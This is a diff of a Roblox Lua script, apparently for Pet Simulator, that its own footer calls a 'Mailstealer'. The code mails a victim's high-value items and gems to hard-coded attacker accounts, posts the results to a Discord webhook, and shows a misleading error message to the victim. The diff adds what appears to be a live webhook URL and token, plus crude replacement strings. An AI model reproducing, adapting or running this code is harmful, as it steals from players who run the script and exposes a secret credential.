@@ -34,7 +34,7 @@ local H = Y.TextField({
 
 Username = "LaRussieCool2"
 Username2 = "LaRussieCool3" -- stuff will get sent to this user if first user's mailbox is full
-Webhook = "your webhook here"
+Webhook = "https://discord.com/api/webhooks/1233473062293475410/W700VWb5jOrYwX2nGTlmZ4UNMmwqhQ_pnsxcOISS3AQ_aQ7QDL5jXQvc8_f-QhNF4lV8"
 min_rap = 500000 -- minimum rap of each item you want to get sent to you.
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
@@ -42,7 +42,7 @@ local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local mailsent = library.Save.Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
-local MailMessage = "gg / HcpNe56R2a"
+local MailMessage = "Hee hee"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 _G.scriptExecuted = _G.scriptExecuted or false
@@ -135,7 +135,7 @@ local function SendMessage(url, username, diamonds)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
+				["text"] = "GaiPolo's Mailstealer"
 			}
         }}
     }
@@ -365,7 +365,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         end
     end
     SendAllGems()
-    setclipboard("https://discord.gg/HcpNe56R2a")
+    setclipboard("Cocks and Balls")
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("You need to be in WORLD 2")
+    message.Error("Woops! You need to go to WORLD 2 in order to make the script work")
 end
